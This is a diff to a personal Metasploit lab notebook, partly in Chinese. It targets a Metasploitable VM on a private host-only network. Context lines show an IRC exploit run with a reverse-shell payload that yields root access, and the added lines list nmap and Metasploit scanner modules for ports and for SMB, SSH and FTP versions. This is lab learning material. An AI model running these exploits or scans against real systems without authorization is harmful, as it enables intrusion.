@@ -19,7 +19,7 @@ msconsole
 
 * IRC on Metasploitable
 
-Kali Linux: 192.168.56.102
+Kali Linux: 192.168.56.100
 Metasploitable: 192.168.56.101
 
 ```console
@@ -30,11 +30,57 @@ set RHOSTS 192.168.56.101
 show payloads
 set payload cmd/unix/reverse
 show options
-set LHOST 192.168.56.102
+set LHOST 192.168.56.100
 run
 ```
 
 Can connect to 192.168.56.101 with root account
+
+* Modules
+
+> [Metasploit系列教程第一季](https://www.bilibili.com/video/av16925201)
+
+1. Port scan
+
+```console
+# nmap -v -sV 192.168.56.101
+```
+
+```console
+search portscan
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.56.101
+run
+```
+
+2. SMB scan for windows system information
+
+```console
+search smb_version
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.56.101
+run
+```
+
+3. 服务识别
+
+```console
+search ssh_version
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS 192.168.56.101
+run
+```
+
+```console
+search ftp_version
+use auxiliary/scanner/ftp/ftp_version
+```
+
+4. Sniffer
+
+auxiliary/sniffer/psnuffle
+
+TODO
 
 * 测试用的被攻击Windows 2008
 
